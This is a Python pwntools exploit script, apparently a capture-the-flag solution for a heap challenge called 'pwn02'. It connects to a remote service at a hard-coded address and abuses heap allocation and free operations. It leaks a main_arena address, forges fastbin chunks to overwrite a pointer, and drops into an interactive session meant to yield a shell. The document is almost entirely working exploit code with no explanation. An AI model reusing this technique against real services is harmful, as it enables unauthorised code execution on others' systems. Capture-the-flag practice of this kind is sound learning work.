#!/usr/bin/python
#coding=utf-8
from pwn import *
#r = process('./pwn02')
r = remote("39.100.87.24",8102)
context.terminal=["tmux","splitw","-h"]
def debug():
	gdb.attach(r,'''
	b *0x00000000040096F
	b *0x0000000004009AD
	b *0x00000000040098E
	b malloc
	''')
def malloc_chunk(idx,size,content):
	r.recvuntil('> ')
	r.sendline('1')
	r.sendline(str(idx))
	r.sendline(str(size))	
	r.sendline(str(content))

def free_chunk(idx):
	r.recvuntil('> ')
	r.sendline('2')
	r.sendline(str(idx))

def puts_chunk(idx):
	r.recvuntil('> ')
	r.sendline('3')
	r.sendline(str(idx))
	#return hex(u64(r.recvline('\n')[:-1].ljust(8,'\x00')))


malloc_chunk(0,0x30,'aaaa')
malloc_chunk(1,0x30,'bbbb')
malloc_chunk(2,0x100,'AAAA')
malloc_chunk(3,0x30,'/bin/sh\x00')
free_chunk(2)
puts_chunk(2)
main_arena=u64(r.recvuntil("\n",drop=True).ljust(8,'\x00'))-88
success("main_arena ==> "+hex(main_arena))
fake_chunk=main_arena+0x18-0x10+8
free_chunk(1)
free_chunk(0)
payload='A'*0x30
payload+=p64(0x40)+p64(0x41)
payload+=p64(0x60)         
malloc_chunk(4,0x30,payload)
malloc_chunk(5,0x30,'A')
malloc_chunk(0,0x100,'A')
malloc_chunk(6,0x50,'aaaa')
malloc_chunk(7,0x50,'bbbb')
free_chunk(7)
free_chunk(6)
payload='A'*0x50
payload+=p64(0x60)+p64(0x61)
payload+=p64(fake_chunk)
malloc_chunk(8,0x50,payload)
malloc_chunk(9,0x50,'A')

payload='\x00'*0x38
payload+=p64(0x000000000600DD8-8)
#debug()
malloc_chunk(1,0x50,payload)
free_chunk(5)
free_chunk(4)
malloc_chunk(0,0x30,'A'*0x30+p64(0x40)+p64(0x41)+p64(0))
malloc_chunk(0,0x30,'A')
malloc_chunk(2,0x30,'\xb0\x06\x40\x00\x00\x00')
puts_chunk(3)
r.interactive()

